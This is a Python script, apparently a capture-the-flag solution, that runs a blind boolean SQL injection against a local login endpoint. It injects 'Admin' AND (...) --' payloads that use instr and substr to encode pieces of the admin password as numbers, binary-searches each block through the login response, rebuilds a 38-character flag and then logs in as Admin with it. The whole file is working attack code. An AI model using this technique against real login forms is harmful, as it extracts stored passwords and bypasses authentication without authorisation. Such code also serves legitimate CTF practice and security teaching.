from math import ceil
import requests

FLAG_CHARSET = "".join(chr(i) for i in range(33, 127))
FLAG_LENGTH = 38

URL = "http://127.0.0.1:5000"


def login(username, password):
    res = requests.post(
        f"{URL}/login", data={"username": username, "password": password})
    return res, res.text


def try_payload(payload):
    _, text = login(payload, "")
    return "Logged in!" in text


def gen_payload(block_index, max_num):
    payload = "Admin' AND ("
    flag_charset_escaped = FLAG_CHARSET.replace("'", "''")
    for i in range(BLOCK_SIZE):
        payload += f"instr('{flag_charset_escaped}', substr(substr(password, {1 + BLOCK_SIZE * block_index}, {BLOCK_SIZE}), {i+1}, 1)) * {(len(FLAG_CHARSET)+1)**i} + "
    payload = payload[:-3] + f") < {max_num} --"
    return payload


def custom_string_to_int(s):
    return sum((FLAG_CHARSET.index(c) + 1) * (len(FLAG_CHARSET) + 1) ** i for i, c in enumerate(s))


def custom_int_to_string(n):
    s = ""
    while n > 0:
        n, r = divmod(n, len(FLAG_CHARSET) + 1)
        s += FLAG_CHARSET[r-1]
    return s


for char in FLAG_CHARSET:
    assert custom_int_to_string(custom_string_to_int(
        char)) == char, f"Failed for {char}"
assert custom_int_to_string(custom_string_to_int(FLAG_CHARSET)) == FLAG_CHARSET


BLOCK_SIZE = 2  # Seems to be optimal from testing
NUM_BLOCKS = ceil(FLAG_LENGTH / BLOCK_SIZE)
MAX_NUM = custom_string_to_int(FLAG_CHARSET[-1] * BLOCK_SIZE)

num_requests = 0
flag = ""
for block_index in range(NUM_BLOCKS):
    min_num = 0
    max_num = MAX_NUM
    while True:
        attempt_num = (min_num + max_num) // 2
        payload = gen_payload(block_index, attempt_num)
        num_requests += 1
        is_success = try_payload(payload)
        if is_success:
            max_num = (min_num + max_num) // 2
        else:
            min_num = (min_num + max_num) // 2
        if max_num - min_num <= 1:
            if is_success:
                block = custom_int_to_string(min_num)
            else:
                block = custom_int_to_string(attempt_num)
            if max_num == MAX_NUM:
                if try_payload(gen_payload(block_index, MAX_NUM)):
                    block = custom_int_to_string(MAX_NUM - 1)
                else:
                    block = custom_int_to_string(MAX_NUM)
            flag += block
            print(flag)
            break

print(login("Admin", flag))
print("Number of requests:", num_requests)
